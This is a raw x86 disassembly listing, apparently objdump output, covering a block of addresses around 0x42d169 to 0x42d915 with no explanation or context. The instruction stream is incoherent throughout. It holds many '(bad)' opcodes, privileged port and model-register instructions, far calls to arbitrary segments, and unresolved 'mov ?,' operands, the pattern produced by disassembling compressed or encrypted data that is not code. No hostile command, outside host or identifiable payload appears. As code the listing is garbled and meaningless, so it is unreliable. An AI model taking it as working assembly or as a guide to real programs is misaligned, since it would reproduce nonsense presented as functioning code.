  42d169:	fldcw  WORD PTR [ecx+0x53]
  42d16c:	add    al,0x2e
  42d16e:	aam    0xf9
  42d170:	sbb    BYTE PTR [eax+0xb],0x0
  42d174:	and    edx,edi
  42d176:	and    eax,0xe22574db
  42d17b:	into   
  42d17c:	sbb    al,0x87
  42d17e:	and    eax,0xb2eda2d6
  42d183:	sbb    eax,0x3ae9535b
  42d188:	aam    0x91
  42d18a:	push   ss
  42d18b:	mov    es,WORD PTR [ebx+0x4d71d055]
  42d191:	jmp    0x1211:0x7243ae80
  42d198:	ret    0xd68a
  42d19b:	cwde   
  42d19c:	adc    al,0x70
  42d19e:	in     eax,dx
  42d19f:	mov    es,WORD PTR [ecx]
  42d1a1:	call   0xa1fc:0x3c56a0f1
  42d1a8:	push   ss
  42d1a9:	enter  0x68bd,0x10
  42d1ad:	mov    ebx,0xa90a8a1a
  42d1b2:	push   esi
  42d1b3:	sbb    esp,DWORD PTR [edx-0x62]
  42d1b6:	retf   
  42d1b7:	fiadd  DWORD PTR [ebx]
  42d1b9:	sar    DWORD PTR [esi-0x40],1
  42d1bc:	test   DWORD PTR [ebx-0x18],esi
  42d1bf:	repnz stos BYTE PTR es:[edi],al
  42d1c1:	gs adc bl,al
  42d1c4:	es popa 
  42d1c6:	adc    bl,BYTE PTR [edx]
  42d1c8:	push   eax
  42d1c9:	dec    ecx
  42d1ca:	jp     0x42d150
  42d1cc:	add    eax,0x1ec0a85f
  42d1d1:	(bad)  
  42d1d2:	test   al,0x48
  42d1d4:	jmp    0xe087c30e
  42d1d9:	test   DWORD PTR [edx-0x3b],edi
  42d1dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1dd:	clc    
  42d1de:	int3   
  42d1df:	pop    eax
  42d1e0:	in     eax,0x58
  42d1e2:	push   eax
  42d1e3:	adc    dh,bh
  42d1e5:	(bad)  
  42d1e6:	dec    edx
  42d1e7:	sub    eax,0x5a980cba
  42d1ec:	(bad)  
  42d1ed:	mov    al,0xe1
  42d1ef:	sbb    BYTE PTR [esi+0x68],dl
  42d1f2:	push   cs
  42d1f3:	pop    esp
  42d1f4:	das    
  42d1f5:	inc    esp
  42d1f6:	mov    es,WORD PTR [edx+eiz*4]
  42d1f9:	add    dh,BYTE PTR [eax+0xb]
  42d1fc:	mov    dl,0x18
  42d1fe:	jl     0x42d1ad
  42d200:	mov    edx,0xa6a25c4b
  42d206:	retf   0xe1e0
  42d209:	sub    BYTE PTR [edx],0xdb
  42d20c:	mov    cs,WORD PTR [eax+0x66d31c90]
  42d212:	les    eax,FWORD PTR [edx+0x6b]
  42d215:	adc    ch,BYTE PTR [edx]
  42d217:	rol    DWORD PTR [edx],0xd1
  42d21a:	out    0x3b,al
  42d21c:	mov    dh,0x8a
  42d21e:	dec    ebx
  42d21f:	mov    ds:0xa2804e54,al
  42d224:	mov    cs,WORD PTR [edx+0x18deca89]
  42d22a:	mov    edx,es
  42d22c:	bound  ecx,QWORD PTR [eax]
  42d22e:	add    al,0x2
  42d230:	cwde   
  42d231:	scas   al,BYTE PTR es:[edi]
  42d232:	jl     0x42d29c
  42d234:	add    BYTE PTR [edi],dh
  42d236:	test   ebp,ecx
  42d238:	push   ss
  42d239:	cld    
  42d23a:	add    eax,0x9946a681
  42d23f:	pop    esp
  42d240:	push   es
  42d241:	and    al,0xb4
  42d243:	sub    esp,eax
  42d245:	sbb    BYTE PTR [ebx],ch
  42d247:	ret    0x4a9
  42d24a:	fbld   TBYTE PTR [esi+0x7e1809aa]
  42d250:	xchg   BYTE PTR [ecx-0x45d71498],dl
  42d256:	pusha  
  42d257:	push   esp
  42d258:	(bad)  
  42d259:	pop    ecx
  42d25a:	push   es
  42d25b:	into   
  42d25c:	pop    esi
  42d25d:	sub    dh,BYTE PTR [ebp+0x5e0647b3]
  42d263:	fs dec esi
  42d265:	and    eax,0xf44e592c
  42d26a:	or     ah,BYTE PTR [ecx-0x7d]
  42d26d:	sbb    BYTE PTR [edx-0x30],al
  42d270:	pop    esp
  42d271:	push   cs
  42d272:	mov    ?,WORD PTR [eax]
  42d274:	dec    esp
  42d275:	lods   al,BYTE PTR ds:[esi]
  42d276:	sub    al,BYTE PTR [eax-0x2d42fb02]
  42d27c:	fst    QWORD PTR [eax]
  42d27e:	mov    dh,0xb
  42d280:	or     BYTE PTR [edi-0x752ea2ca],cl
  42d286:	mov    eax,ds:0x8cc12904
  42d28b:	inc    eax
  42d28c:	sti    
  42d28d:	mov    dl,0x66
  42d28f:	cs retf 0x823
  42d293:	cmp    DWORD PTR [esi+ecx*1+0x63782237],eax
  42d29a:	jo     0x42d24c
  42d29c:	shl    DWORD PTR [ecx],0xa0
  42d29f:	push   edx
  42d2a0:	mov    ah,0x8
  42d2a2:	bound  esp,QWORD PTR [eax-0x51]
  42d2a5:	mov    al,ds:0x56d043aa
  42d2aa:	mov    esp,0x54224e00
  42d2af:	out    dx,al
  42d2b0:	jg     0x42d2bb
  42d2b2:	sub    al,0x30
  42d2b4:	pusha  
  42d2b5:	ficom  WORD PTR [ecx-0x104e0bef]
  42d2bb:	add    BYTE PTR [ebx],dh
  42d2bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2be:	fsub   DWORD PTR [esi]
  42d2c0:	pop    eax
  42d2c1:	pusha  
  42d2c2:	cmp    ch,BYTE PTR [esi-0x3b8186b7]
  42d2c8:	add    ebx,edx
  42d2ca:	jl     0x42d334
  42d2cc:	and    al,BYTE PTR [edx+0x41]
  42d2cf:	xchg   BYTE PTR fs:[esi+ecx*1],bl
  42d2d3:	stos   BYTE PTR es:[edi],al
  42d2d4:	sbb    edx,DWORD PTR [eax+0x5a]
  42d2d7:	out    dx,al
  42d2d8:	bound  esi,QWORD PTR [eax+0x38]
  42d2db:	mov    dh,0xa6
  42d2dd:	addr16 loop 0x42d287
  42d2e0:	add    al,0x28
  42d2e2:	jl     0x42d30c
  42d2e4:	fisubr DWORD PTR [eax+0x3415b4b1]
  42d2ea:	push   cs
  42d2eb:	or     eax,0x34161e9c
  42d2f0:	call   0x2c4:0x5ba86b8a
  42d2f7:	xchg   esi,eax
  42d2f8:	ror    eax,1
  42d2fa:	sbb    eax,0xa3c136d6
  42d2ff:	mov    DWORD PTR [eax+0x7660b6e8],ebp
  42d305:	mov    al,ds:0x9f2a1e0a
  42d30a:	or     BYTE PTR [eax+esi*4+0x6a16e823],ch
  42d311:	mov    ch,0xf2
  42d313:	stos   DWORD PTR es:[edi],eax
  42d314:	xchg   ebp,eax
  42d315:	or     DWORD PTR [ecx+0x4000c098],esp
  42d31b:	rcl    BYTE PTR [ebp+0x7b79a15e],1
  42d321:	xchg   esp,eax
  42d322:	sahf   
  42d323:	jle    0x42d313
  42d325:	enter  0xb000,0xad
  42d329:	out    0xd0,eax
  42d32b:	retf   
  42d32c:	hlt    
  42d32d:	push   esp
  42d32e:	and    bl,dl
  42d330:	xor    esi,esi
  42d332:	or     DWORD PTR [edx],0x70
  42d335:	add    BYTE PTR [eax+eax*2+0x64],cl
  42d339:	adc    BYTE PTR [edx],dl
  42d33b:	push   esi
  42d33c:	sbb    ch,BYTE PTR [edx+0x7b188b14]
  42d342:	fild   WORD PTR [esi+0x4e]
  42d345:	call   0x9cde0aee
  42d34a:	(bad)  
  42d34b:	sbb    ebp,DWORD PTR [eax+edi*1]
  42d34e:	fiadd  WORD PTR [eax]
  42d350:	lock push 0x1fa37c0a
  42d356:	push   0x4cca14a6
  42d35b:	mov    ds,WORD PTR [esi-0x19]
  42d35e:	jg     0x42d333
  42d360:	xchg   ebx,eax
  42d361:	adc    edx,0x345e9b3a
  42d367:	test   BYTE PTR [eax],al
  42d369:	sbb    al,0x8b
  42d36b:	add    BYTE PTR [edx+0x682534ed],cl
  42d371:	call   0xd5555819
  42d376:	xchg   ebx,eax
  42d377:	fdiv   DWORD PTR [ebp+eiz*1-0x5f]
  42d37b:	inc    eax
  42d37c:	test   esp,esi
  42d37e:	jl     0x42d3e4
  42d380:	mov    eax,ds:0x84a2ace
  42d385:	sub    esi,DWORD PTR [eax]
  42d387:	dec    edx
  42d388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d389:	sub    al,0x2
  42d38b:	mov    al,0x45
  42d38d:	push   ebp
  42d38e:	or     eax,0x231efc98
  42d393:	xchg   BYTE PTR [ebp-0x767a05b2],ch
  42d399:	sub    sp,WORD PTR [esi-0x41]
  42d39d:	mov    BYTE PTR [edx-0x25c16697],dl
  42d3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3a4:	push   edi
  42d3a5:	shl    DWORD PTR [ebp+0x5e74de5a],0xcf
  42d3ac:	imul   esi,DWORD PTR [edx-0x426f6bb3],0x12
  42d3b3:	hlt    
  42d3b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d3b5:	call   0xd10358ae
  42d3ba:	mov    al,ds:0xf89e5c24
  42d3bf:	mov    esp,0x970eda02
  42d3c4:	aam    0x56
  42d3c6:	data16 adc dl,dh
  42d3c9:	jbe    0x42d427
  42d3cb:	dec    ebp
  42d3cc:	lods   eax,DWORD PTR ds:[esi]
  42d3cd:	jecxz  0x42d351
  42d3cf:	mov    dl,0x79
  42d3d1:	test   al,0xaa
  42d3d3:	les    ecx,FWORD PTR [ecx]
  42d3d5:	mov    al,ds:0x2b612425
  42d3da:	mov    dl,0x32
  42d3dc:	mov    eax,0xd40a4fa4
  42d3e1:	jno    0x42d43d
  42d3e3:	and    DWORD PTR [esi],esp
  42d3e5:	lock xchg BYTE PTR [ebx+0x5b43b816],dh
  42d3ec:	rol    BYTE PTR [ebx+ebp*4+0x2a],0xc2
  42d3f1:	bound  edi,QWORD PTR [eax-0x3e]
  42d3f4:	and    dh,BYTE PTR [ecx]
  42d3f6:	shl    BYTE PTR [ecx-0x53],1
  42d3f9:	in     eax,dx
  42d3fa:	sub    BYTE PTR [esi],dl
  42d3fc:	dec    esp
  42d3fd:	xchg   edi,eax
  42d3fe:	lods   al,BYTE PTR ds:[esi]
  42d3ff:	retf   0x9686
  42d402:	out    0xe,al
  42d404:	mov    eax,ds:0x48b0dfe6
  42d409:	inc    ebp
  42d40a:	add    ah,ch
  42d40c:	test   BYTE PTR [eax],al
  42d40e:	xor    DWORD PTR [esi*4+0x8237044],0x7a4000d
  42d419:	call   0xc54562de
  42d41e:	inc    edi
  42d41f:	repz out dx,al
  42d421:	dec    eax
  42d422:	cld    
  42d423:	or     al,0x66
  42d425:	dec    ecx
  42d426:	or     DWORD PTR [eax+0x6d1292e1],esi
  42d42c:	add    ah,BYTE PTR [esp+eax*8]
  42d42f:	ror    BYTE PTR [eax],1
  42d431:	sub    BYTE PTR [esp+esi*2+0x62],al
  42d435:	sbb    BYTE PTR [eax+0x16],bl
  42d438:	sub    BYTE PTR [ebp-0x47],al
  42d43b:	lock mov ds:0x35427678,al
  42d441:	push   eax
  42d442:	iret   
  42d443:	adc    cl,BYTE PTR [edx-0x27f4772f]
  42d449:	sbb    bl,BYTE PTR [edx-0x650293ab]
  42d44f:	and    cl,BYTE PTR [ebp+0x2dacc28c]
  42d455:	or     ch,BYTE PTR [eax+ecx*1]
  42d458:	push   ds
  42d459:	nop
  42d45a:	mov    WORD PTR [edi],ds
  42d45c:	sub    DWORD PTR [ebp+ebp*1-0x8],edx
  42d460:	adc    al,0x2a
  42d462:	push   esp
  42d463:	test   eax,0x4e90d57a
  42d468:	(bad)  
  42d469:	push   ss
  42d46a:	fdiv   st,st(6)
  42d46c:	or     eax,0x7094ee16
  42d471:	xor    eax,0x32e81e6a
  42d476:	(bad)  
  42d477:	xchg   ebx,eax
  42d478:	mov    cl,0xc0
  42d47a:	pop    eax
  42d47b:	inc    edx
  42d47c:	outs   dx,DWORD PTR ds:[esi]
  42d47d:	inc    esp
  42d47e:	ss pusha 
  42d480:	mov    esp,0xbca8503d
  42d485:	(bad)  
  42d487:	adc    edx,DWORD PTR [eax]
  42d489:	dec    edx
  42d48a:	nop
  42d48b:	add    BYTE PTR [eax+0x56241f1d],ah
  42d491:	shl    BYTE PTR [ebx],1
  42d493:	pusha  
  42d494:	ret    0x5ae4
  42d497:	out    dx,eax
  42d498:	xor    BYTE PTR [ebp+0x12],ch
  42d49b:	ins    DWORD PTR es:[edi],dx
  42d49c:	mov    eax,0xca740810
  42d4a1:	jb     0x42d45c
  42d4a3:	or     dl,BYTE PTR [edx+edx*1+0x30]
  42d4a7:	pop    ecx
  42d4a8:	pop    edx
  42d4a9:	mov    ah,0x76
  42d4ab:	cmp    al,BYTE PTR [ecx+0x1f]
  42d4ae:	and    eax,0x38714e22
  42d4b3:	dec    ecx
  42d4b4:	mov    al,0xa1
  42d4b6:	sar    dh,1
  42d4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4b9:	xor    bl,BYTE PTR [ebp+0x22]
  42d4bc:	pushf  
  42d4bd:	inc    edx
  42d4be:	push   eax
  42d4bf:	and    DWORD PTR [edx+0x64ac7b76],esp
  42d4c5:	(bad)  
  42d4c6:	bound  ecx,QWORD PTR [ebx+0x50]
  42d4c9:	inc    eax
  42d4ca:	push   0x595e9c82
  42d4cf:	ror    BYTE PTR [ebx-0x4b],0x4a
  42d4d3:	xor    al,0x8b
  42d4d5:	mov    dh,0xeb
  42d4d7:	outs   dx,DWORD PTR ds:[esi]
  42d4d8:	and    BYTE PTR ds:[ecx+0x34a3e8e9],al
  42d4df:	lods   al,BYTE PTR ds:[esi]
  42d4e0:	inc    esi
  42d4e1:	xor    eax,0x122b26b6
  42d4e6:	ins    BYTE PTR es:[edi],dx
  42d4e7:	ret    0xa52
  42d4ea:	sub    BYTE PTR [ecx+esi*1-0x3052504e],ch
  42d4f1:	add    al,0x8a
  42d4f3:	push   esp
  42d4f4:	sub    ebx,edx
  42d4f6:	mov    DWORD PTR [eax+0x38],ecx
  42d4f9:	sub    eax,0xc578005c
  42d4fe:	rol    BYTE PTR [ecx+0x4434054d],cl
  42d504:	sbb    eax,edi
  42d506:	or     dh,BYTE PTR [ebp-0x7f]
  42d509:	lods   eax,DWORD PTR ds:[esi]
  42d50a:	or     al,dl
  42d50c:	test   DWORD PTR [esi+0x3b],esi
  42d50f:	xor    dh,BYTE PTR [ebx+0x3a]
  42d512:	imul   esi,DWORD PTR [ebp-0x7794f17e],0xefa8ca66
  42d51c:	cmp    al,0xa5
  42d51e:	mov    BYTE PTR [ecx-0x65],al
  42d521:	xchg   DWORD PTR [eax+0x640ca0ad],eax
  42d527:	push   ebp
  42d528:	add    eax,0x6ae72263
  42d52d:	test   BYTE PTR [edx+0x5a],0x64
  42d531:	adc    BYTE PTR [eax+edi*8+0x793afad2],ah
  42d538:	jo     0x42d4f1
  42d53a:	test   BYTE PTR [ebp+edx*2+0x3683e306],0xa4
  42d542:	jbe    0x42d555
  42d544:	fs scas al,BYTE PTR es:[edi]
  42d546:	mov    eax,0xa260f100
  42d54b:	stc    
  42d54c:	sbb    BYTE PTR [ecx+0x46bf3e00],dl
  42d552:	jb     0x42d4d9
  42d554:	and    BYTE PTR [esi],al
  42d556:	loopne 0x42d532
  42d558:	ins    BYTE PTR es:[edi],dx
  42d559:	mov    al,0x21
  42d55b:	pop    esp
  42d55c:	test   BYTE PTR [eax],ah
  42d55e:	pusha  
  42d55f:	das    
  42d560:	es call 0x55ee:0x472f0065
  42d568:	aam    0x50
  42d56a:	and    DWORD PTR [edx-0x16cd4e18],ebx
  42d570:	xchg   BYTE PTR [ebx],dl
  42d572:	add    bh,BYTE PTR [eax+0x4c5e8128]
  42d578:	dec    esp
  42d579:	cmp    DWORD PTR [esp+edx*2],esp
  42d57c:	mov    ah,0x4d
  42d57e:	cli    
  42d57f:	xchg   ecx,eax
  42d580:	(bad)  
  42d581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d582:	jo     0x42d589
  42d584:	rol    DWORD PTR ds:0x28ddb8a1,0x94
  42d58b:	(bad)  
  42d58c:	xchg   ebx,eax
  42d58d:	shr    DWORD PTR [edx-0x1],1
  42d590:	mov    ah,0xf6
  42d592:	scas   al,BYTE PTR es:[edi]
  42d593:	imul   esp,eax,0x59
  42d596:	mov    bh,0xc
  42d598:	jp     0x42d5da
  42d59a:	push   edx
  42d59b:	jecxz  0x42d5af
  42d59d:	imul   ebp,DWORD PTR [ebp-0x7631be5d],0x5a
  42d5a4:	mov    BYTE PTR [edx+0x4d],ch
  42d5a7:	loop   0x42d5ac
  42d5a9:	(bad)  
  42d5aa:	sbb    bl,BYTE PTR es:[edx]
  42d5ad:	ins    BYTE PTR es:[edi],dx
  42d5ae:	outs   dx,BYTE PTR ds:[esi]
  42d5af:	cmp    DWORD PTR [esi-0x22b28b0],edi
  42d5b5:	loopne 0x42d5b7
  42d5b7:	adc    al,0x9d
  42d5b9:	fidivr DWORD PTR [edx+0x2b4e0d6]
  42d5bf:	imul   esi,DWORD PTR [edx],0xffffffa0
  42d5c2:	sbb    edi,DWORD PTR [eax+0x296a9c42]
  42d5c8:	in     eax,dx
  42d5c9:	mov    dl,0xd6
  42d5cb:	imul   edi,DWORD PTR [eax+0x5c],0xfe9ae91c
  42d5d2:	pop    esp
  42d5d3:	test   al,0x36
  42d5d5:	stos   DWORD PTR es:[edi],eax
  42d5d6:	js     0x42d600
  42d5d8:	out    dx,al
  42d5d9:	and    al,0xf6
  42d5db:	pop    esi
  42d5dc:	cmp    ebx,DWORD PTR [eax-0x54]
  42d5df:	xchg   esp,eax
  42d5e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d5e1:	push   ebp
  42d5e2:	or     al,cl
  42d5e4:	mov    edx,0xc8403f74
  42d5e9:	push   ds
  42d5ea:	ror    DWORD PTR [ebp-0x1be2f252],0x51
  42d5f1:	cmp    al,cl
  42d5f3:	je     0x42d63f
  42d5f5:	mov    ss,WORD PTR [ecx-0x53]
  42d5f8:	push   cs
  42d5f9:	psadbw mm4,QWORD PTR [ebp+0x53]
  42d5fd:	lahf   
  42d5fe:	sub    bl,BYTE PTR [edx+esi*8]
  42d601:	pop    es
  42d602:	pop    edx
  42d603:	fstp   TBYTE PTR [esi-0x7d3ba496]
  42d609:	jge    0x42d5f3
  42d60b:	fadd   DWORD PTR [edx+0xf85a08f]
  42d611:	push   0xffffffd3
  42d613:	jmp    0x92b1b846
  42d618:	ja     0x42d670
  42d61a:	je     0x42d630
  42d61c:	cwde   
  42d61d:	inc    edx
  42d61e:	lock repnz and al,0x19
  42d622:	or     ah,BYTE PTR [eax+0x36]
  42d625:	or     eax,0x3816071d
  42d62a:	dec    esp
  42d62b:	jle    0x42d62f
  42d62d:	cwde   
  42d62e:	pop    ebp
  42d62f:	mov    al,ds:0x586a2b68
  42d634:	mov    bl,0x7a
  42d636:	shl    esp,1
  42d638:	aad    0x94
  42d63a:	cwde   
  42d63b:	sub    eax,0x4cf5d42a
  42d640:	adc    al,BYTE PTR [edi]
  42d642:	into   
  42d643:	lds    ebp,FWORD PTR [esi]
  42d645:	int    0x86
  42d647:	mov    dh,0xa8
  42d649:	ret    
  42d64a:	xor    al,0x72
  42d64c:	mov    esi,0x282b99fe
  42d651:	imul   edi,DWORD PTR [eax],0x9a986851
  42d657:	test   BYTE PTR [edi],bl
  42d659:	mov    al,ds:0x210c58ae
  42d65e:	cmp    al,0x4
  42d660:	xor    al,BYTE PTR [ebx-0x48ae331c]
  42d666:	aam    0xd
  42d668:	mov    dh,0x5e
  42d66a:	push   esp
  42d66b:	dec    ebx
  42d66c:	mov    esp,0x5960aa32
  42d671:	les    edi,FWORD PTR [edx+ebp*2-0x62]
  42d675:	inc    esp
  42d676:	popa   
  42d677:	stos   DWORD PTR es:[edi],eax
  42d678:	mov    eax,0xb2be6d56
  42d67d:	xchg   esp,eax
  42d67e:	sub    al,0xcc
  42d680:	fadd   DWORD PTR [esi+0x4434fb0a]
  42d686:	mov    eax,ds:0x8cb40f4
  42d68b:	es or  al,0x4c
  42d68e:	adc    al,0xbc
  42d690:	dec    eax
  42d691:	and    al,0x66
  42d693:	es pop ss
  42d695:	mov    al,0x0
  42d697:	cli    
  42d698:	push   es
  42d699:	xor    DWORD PTR [edi+ebx*1+0x22c83602],0x399c6ebb
  42d6a4:	(bad)  
  42d6a5:	sub    ah,BYTE PTR [ecx]
  42d6a7:	or     DWORD PTR [ebp-0x15255fb8],0x2d554daa
  42d6b1:	ins    DWORD PTR es:[edi],dx
  42d6b2:	or     al,0x6c
  42d6b4:	add    al,BYTE PTR [edx-0x24e7607e]
  42d6ba:	adc    eax,DWORD PTR [ebp+ecx*2+0x36c061b8]
  42d6c1:	bound  edx,QWORD PTR [esi]
  42d6c3:	je     0x42d67e
  42d6c5:	test   al,0xd8
  42d6c7:	push   ecx
  42d6c8:	pusha  
  42d6c9:	jl     0x42d725
  42d6cb:	inc    ebp
  42d6cc:	fsubrp st(5),st
  42d6ce:	mov    BYTE PTR [edx-0x14],ch
  42d6d1:	jecxz  0x42d6d4
  42d6d3:	shl    BYTE PTR [esi],0xc6
  42d6d6:	rcl    BYTE PTR [ebx],1
  42d6d8:	cmp    BYTE PTR [esi],ah
  42d6da:	push   eax
  42d6db:	xchg   cl,dl
  42d6dd:	push   0x4e
  42d6df:	in     al,0x94
  42d6e1:	mov    ?,edx
  42d6e3:	sub    BYTE PTR [esi],bh
  42d6e5:	adc    bl,ch
  42d6e7:	mov    al,0xce
  42d6e9:	fidiv  WORD PTR [ecx+0x2d0d1087]
  42d6ef:	mov    cl,BYTE PTR ds:0x973bb578
  42d6f5:	jp     0x42d709
  42d6f7:	sub    al,BYTE PTR [edi+ebx*4-0x77]
  42d6fb:	xchg   ecx,eax
  42d6fc:	sbb    bh,ah
  42d6fe:	scas   eax,DWORD PTR es:[edi]
  42d6ff:	loopne 0x42d683
  42d701:	into   
  42d702:	mov    dh,0x2a
  42d704:	pop    ebx
  42d705:	shl    BYTE PTR [eax+0x4245ade],1
  42d70b:	pop    esi
  42d70c:	neg    BYTE PTR [ebp-0x4e]
  42d70f:	retf   
  42d710:	sbb    al,BYTE PTR [ebp-0x9483be6]
  42d716:	dec    edx
  42d717:	bnd jl 0x42d69c
  42d71a:	mov    eax,ds:0x56b542d1
  42d71f:	jne    0x42d6cb
  42d721:	or     ebp,DWORD PTR [edi+0x8]
  42d724:	inc    ebp
  42d725:	mov    al,bl
  42d727:	xchg   edx,eax
  42d728:	and    BYTE PTR [ecx+0x1],dl
  42d72b:	push   esp
  42d72c:	mov    dh,0xb8
  42d72e:	mov    BYTE PTR [esi],0x51
  42d731:	imul   ebp,DWORD PTR [eax],0xfffffff8
  42d734:	loopne 0x42d792
  42d736:	sar    BYTE PTR ss:[eax],0xe1
  42d73a:	retf   0x92a6
  42d73d:	or     ebx,DWORD PTR [edx-0x13bfbd28]
  42d743:	push   0xffffff87
  42d745:	xchg   esi,eax
  42d746:	mov    ds:0x2fc25a0a,eax
  42d74b:	adc    DWORD PTR [esi-0x7ffe00c3],esi
  42d751:	add    eax,0x466838ed
  42d756:	add    eax,0xf66d172a
  42d75b:	not    BYTE PTR [ecx]
  42d75d:	fcomp  st(2)
  42d75f:	ror    BYTE PTR [eax+ebx*8-0x12],cl
  42d763:	test   eax,0x3b531480
  42d768:	add    cl,0x83
  42d76b:	mov    DWORD PTR [edx+0xd5627c],esp
  42d771:	mov    cl,0xe4
  42d773:	pop    esi
  42d774:	push   ecx
  42d775:	push   0x478e0f5b
  42d77a:	jnp    0x42d734
  42d77c:	lds    edx,FWORD PTR [esi+0x5123b0e]
  42d782:	lar    esi,sp
  42d785:	cmp    al,0xf6
  42d787:	sbb    cl,BYTE PTR [edx]
  42d789:	call   0xfd7c:0xdaa010d8
  42d790:	shl    BYTE PTR [esi-0x15],0x26
  42d794:	sbb    al,0x2
  42d796:	ret    0x76fc
  42d799:	xchg   esp,eax
  42d79a:	loopne 0x42d7ac
  42d79c:	shr    BYTE PTR [edx],0xc0
  42d79f:	aad    0xc7
  42d7a1:	call   0xa0:0x2450099d
  42d7a8:	test   DWORD PTR [esi],ebp
  42d7aa:	xchg   esi,eax
  42d7ab:	pop    esi
  42d7ac:	scas   eax,DWORD PTR es:[edi]
  42d7ad:	mov    ah,0xa0
  42d7af:	mov    eax,ds:0xa7568282
  42d7b4:	cmp    al,0xd
  42d7b6:	test   BYTE PTR [edx-0x5b248a7b],ah
  42d7bc:	xor    BYTE PTR [ecx+0x34],ah
  42d7bf:	(bad)  
  42d7c0:	mov    al,ds:0xed827e88
  42d7c5:	inc    ebx
  42d7c6:	int    0x2e
  42d7c8:	mov    esp,0xf612b969
  42d7cd:	sbb    eax,0x55055c52
  42d7d2:	or     eax,0x89b961d
  42d7d7:	push   0x3fead242
  42d7dc:	sub    BYTE PTR [eax],ch
  42d7de:	push   0x52799a6a
  42d7e3:	mov    ?,WORD PTR [eax]
  42d7e5:	push   eax
  42d7e6:	mov    ds:0x199b605b,al
  42d7eb:	test   al,0x16
  42d7ed:	ficomp DWORD PTR [esp+eiz*2]
  42d7f0:	xchg   ecx,eax
  42d7f1:	pop    ds
  42d7f2:	sbb    al,0x56
  42d7f4:	aam    0xd5
  42d7f6:	push   eax
  42d7f7:	ficomp WORD PTR [edx-0xb313b1a]
  42d7fd:	in     al,dx
  42d7fe:	mov    WORD PTR [edx-0x2f],gs
  42d801:	add    ebp,edx
  42d803:	xchg   BYTE PTR [eax],cl
  42d805:	mov    esp,0x2ed8ca3c
  42d80a:	hlt    
  42d80b:	pop    ecx
  42d80c:	and    ebp,ecx
  42d80e:	pop    ss
  42d80f:	into   
  42d810:	inc    BYTE PTR [ecx-0x7a]
  42d813:	cmp    ebx,edx
  42d815:	adc    DWORD PTR [esi-0x46],esi
  42d818:	xchg   edi,eax
  42d819:	mov    edi,0xed82548a
  42d81e:	cmp    al,0x98
  42d820:	ret    
  42d821:	push   esp
  42d822:	fmul   DWORD PTR [ebx+0x12]
  42d825:	hlt    
  42d826:	lods   al,BYTE PTR ds:[esi]
  42d827:	mov    dh,0x34
  42d829:	shr    BYTE PTR [ebx],1
  42d82b:	cmp    BYTE PTR [edx],dl
  42d82d:	ss push esp
  42d82f:	cmp    bl,BYTE PTR [ebx]
  42d831:	outs   dx,BYTE PTR ds:[esi]
  42d832:	xor    eax,0x429bcc5c
  42d837:	pusha  
  42d838:	sub    BYTE PTR [edx+ebp*4+0x34],ch
  42d83c:	popa   
  42d83d:	je     0x42d893
  42d83f:	rcr    dl,0xa6
  42d842:	and    BYTE PTR [ebx+0x45e2cd7e],0x3b
  42d849:	dec    esp
  42d84a:	loope  0x42d7e6
  42d84c:	add    esi,DWORD PTR [ecx-0x1d93521f]
  42d852:	xor    al,0x51
  42d854:	mov    ds:0xf3e0100,al
  42d859:	mov    edx,eax
  42d85b:	ss xor ecx,edx
  42d85e:	in     al,dx
  42d85f:	push   0x3f5eb8ef
  42d864:	jle    0x42d836
  42d866:	fwait
  42d867:	jns    0x42d83a
  42d869:	wrmsr  
  42d86b:	adc    bl,dh
  42d86d:	cmp    bl,BYTE PTR [edx-0x730fff60]
  42d873:	inc    esp
  42d874:	inc    edi
  42d875:	push   edi
  42d876:	inc    ecx
  42d877:	daa    
  42d878:	push   es
  42d879:	fcmovnb st,st(2)
  42d87b:	mov    edx,0x63c08da8
  42d880:	or     BYTE PTR [ebp+0x7e],dl
  42d883:	push   ds
  42d884:	sbb    cl,BYTE PTR [ebp-0x56]
  42d887:	xor    DWORD PTR [esi+0x3ba211e0],0x6478e172
  42d891:	sbb    BYTE PTR [ecx+edx*4],dh
  42d894:	mov    edx,0x2888ea95
  42d899:	inc    esp
  42d89a:	arpl   WORD PTR [ebx-0xd],bp
  42d89d:	aaa    
  42d89e:	in     al,dx
  42d89f:	(bad)  
  42d8a0:	sbb    al,0x0
  42d8a2:	sub    BYTE PTR [ebx+0x0],dl
  42d8a5:	lahf   
  42d8a6:	ror    ch,cl
  42d8a8:	rol    BYTE PTR [ebp+ebp*2-0x39],1
  42d8ac:	(bad)  
  42d8ad:	add    al,0xb4
  42d8af:	dec    esp
  42d8b0:	xlat   BYTE PTR ds:[ebx]
  42d8b1:	call   0xf1d5:0x250e609a
  42d8b8:	dec    esi
  42d8b9:	mov    eax,eax
  42d8bb:	js     0x42d881
  42d8bd:	push   esp
  42d8be:	mov    DWORD PTR [esi+0x50],edx
  42d8c1:	test   DWORD PTR [eax-0x3651181e],esi
  42d8c7:	fs add al,0xf0
  42d8ca:	add    BYTE PTR [edx+0x2f],ch
  42d8cd:	in     al,dx
  42d8ce:	mov    ch,0x8d
  42d8d0:	cli    
  42d8d1:	jns    0x42d879
  42d8d3:	jns    0x42d866
  42d8d5:	and    al,0xa1
  42d8d7:	std    
  42d8d8:	xor    al,0xca
  42d8da:	mov    eax,0xb8bb104e
  42d8df:	push   esi
  42d8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8e1:	jno    0x42d92b
  42d8e3:	dec    edi
  42d8e4:	scas   al,BYTE PTR es:[edi]
  42d8e5:	shr    DWORD PTR [esi+ecx*4-0x6faf17ae],0x4e
  42d8ed:	jle    0x42d884
  42d8ef:	es sti 
  42d8f1:	add    BYTE PTR [ebp-0x6e],dl
  42d8f4:	(bad)  
  42d8f5:	fdivr  DWORD PTR [edx]
  42d8f7:	stos   DWORD PTR es:[edi],eax
  42d8f8:	adc    BYTE PTR [esi],0x1d
  42d8fb:	test   DWORD PTR ds:0xefe7a1dd,ecx
  42d901:	cmp    eax,0x1649607a
  42d906:	pop    ebp
  42d907:	sbb    DWORD PTR [eax+0x69],ebx
  42d90a:	pushf  
  42d90b:	push   0xa0860067
  42d910:	or     eax,0x5e6aad4d
  42d915:	les    ebp,FWORD PTR cs:[eax]
